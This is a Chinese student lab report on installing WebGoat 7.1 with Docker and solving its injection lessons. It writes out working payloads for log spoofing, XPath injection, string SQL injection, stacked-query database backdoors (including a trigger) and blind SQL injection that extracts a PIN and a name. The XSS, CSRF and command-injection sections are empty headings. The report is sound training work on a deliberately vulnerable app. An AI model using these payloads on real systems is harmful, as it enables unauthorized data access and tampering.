 

<img src="picture/1.png" alt="1" style="zoom:80%;" />



<center><font face="Arial" size="6">WebGoat Setup and Usag& Injection and XSS & Web Attack</font>



<img src="picture/2.png" alt="2" style="zoom:90%;" />



<center>
    <font face="楷体" size="5">姓名：欧翌昕</font>
</center>

<center>
    <font face="楷体" size="5">专业：软件工程</font>
</center>
<center>
    <font face="楷体" size="5">学号：3190104783</font>
</center>

<center>
    <font face="楷体" size="5">课程名称：安全编程技术</font>
</center>

<center>
    <font face="楷体" size="5">指导老师：胡天磊</font>
</center>


<center>
    </font><font face="黑体" size="5">2020~2021春夏学期 2020 年 5 月 26 日</font>
</center>

# 1 WebGoat Setup and Usage

### 1.1 WebGoat 安装

首先安装 Docker，本机实验环境如下：

<img src="picture/image-20210526085558645.png" alt="image-20210526085558645" style="zoom:80%;" />

在新主机上首次安装 Docker Engine 之前，需要设置 Docker 存储库。 之后可以从存储库安装和更新Docker。

更新 apt 软件包索引并安装软件包，以允许 apt 通过 HTTPS 使用存储库。

```shell
 sudo apt-get update

 sudo apt-get install \
    apt-transport-https \
    ca-certificates \
    curl \
    gnupg \
    lsb-release
```

添加 Docker 的官方 GPG 密钥。

```shell
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
```

使用以下命令来设置稳定的存储库。

```shell
echo \
  "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
```

更新apt软件包索引，并安装最新版本的Docker Engine和容器。

```shell
sudo apt-get update

sudo apt-get install docker-ce docker-ce-cli containerd.io
```

通过运行hello-world映像来验证Docker Engine是否已正确安装。

<img src="picture/image-20210526090902666.png" alt="image-20210526090902666" style="zoom:80%;" />

使用如下命令，下载 WebGoat-7.1 镜像：

```shell
sudo docker pull webgoat/webgoat-7.1
```

查看已下载镜像，观察到 WebGoat-7.1 已下载成功。

<img src="picture/image-20210526093312282.png" alt="image-20210526093312282" style="zoom:80%;" />

使用如下命令，启动容器运行 WebGoat：

```shell
sudo docker run -p 8080:8080 -t webgoat/webgoat-7.1
```

本机浏览器打开 http://127.0.0.1:8080/WebGoat/login 即可使用 WebGoat。

### 1.2 WebGoat使用

<img src="picture/image-20210526110051916.png" alt="image-20210526110051916" style="zoom: 40%;" />

输入默认创建的用户名及密码即可登录。

<img src="picture/image-20210526110757653.png" alt="image-20210526110757653" style="zoom:40%;" />

---



# 2 Injection and XSS

## 2.1 Injection Flaws

### 2.1.1 Command Injection



### 2.1.2 Numeric SQL Injection



### 2.1.3 Log Spoofing

![image-20210529165100845](picture/image-20210529165100845.png)

可以利用换行，在日志中造成登陆成功的假象。在用户名一栏输入如下字符串：

```
Alice%0d%0aLogin Succeeded for username: admin
```

结果如下：

![image-20210529165305931](picture/image-20210529165305931.png)

### 2.1.4 XPATH Injection

![image-20210529165419122](picture/image-20210529165419122.png)

输入自己账户名和密码测试一下，结果如下：

![image-20210529165715453](picture/image-20210529165715453.png)

在用户名一栏输入如下字符串，密码任意输入：

```
Mike' or 1 or '1
```

结果如下：

![image-20210529165927770](picture/image-20210529165927770.png)

### 2.1.5 String SQL Injection

![image-20210529170024754](picture/image-20210529170024754.png)

可输入以下字符串：

```
Smith' or 1=1--
```

结果如下：

![image-20210529170644763](picture/image-20210529170644763.png)

### 2.1.6 Database Backdoors

![image-20210529171647979](picture/image-20210529171647979.png)

可输入以下字符串：

```
101; update employee set salary=100000000 where userid=101--
```

结果如下：

![image-20210529171744141](picture/image-20210529171744141.png)

可输入以下字符串：

```
101;CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com' WHERE userid = NEW.userid
```

结果如下：

![image-20210529171922714](picture/image-20210529171922714.png)

### 2.1.7 Blind Numeric SQL Injection

![image-20210529172254093](picture/image-20210529172254093.png)

可采用二分法确定 `pin` 的取值。

```
101;select pin from pins where cc_number =1111222233334444 and pin<5000
```

结果合法。

```
101;select pin from pins where cc_number =1111222233334444 and pin<2500
```

结果合法。

```
101;select pin from pins where cc_number =1111222233334444 and pin<1300
```

结果非法。

```
101;select pin from pins where cc_number =1111222233334444 and pin>2000
```

结果合法。

```
101;select pin from pins where cc_number =1111222233334444 and pin>2300
```

结果合法。

```
101;select pin from pins where cc_number =1111222233334444 and pin>2400
```

结果非法。

```
101;select pin from pins where cc_number =1111222233334444 and pin<2350
```

结果非法。

```
101;select pin from pins where cc_number =1111222233334444 and pin>2375
```

结果非法。

```
101;select pin from pins where cc_number =1111222233334444 and pin<2363
```

结果非法。

```
101;select pin from pins where cc_number =1111222233334444 and pin>2367
```

结果非法。

```
101;select pin from pins where cc_number =1111222233334444 and pin=2364
```

结果合法，确定 `pin` 的取值为2364。

### 2.1.8 Blind String SQL Injection

![image-20210529172907773](picture/image-20210529172907773.png)

首先确定`name`存储的字符串的长度，经试验长度为4，所输入的字符串如下：

```
101;select name from pins where cc_number=4321432143214321 and length(name)=4
```

枚举可能的表示名字的字符串，最终确定`name`存储的字符串为`Jill`。

```
101;select name from pins where cc_number=4321432143214321 and substr(name,1,4)='Jill'
```

![image-20210529192514410](picture/image-20210529192514410.png)

## 2.2 Cross-Site Scripting

### 2.2.1 Phishing with XSS



### 2.2.2 Stored XSS Attacks



### 2.2.3 Reflected XSS Attacks



### 2.2.4 Cross Site Request Forgery (CSRF)



### 2.2.5 CSRF Prompt By-Pass



### 2.2.6 CSRF Token By-Pass



### 2.2.7 HTTPOnly Test



---



# 3 Web Attack
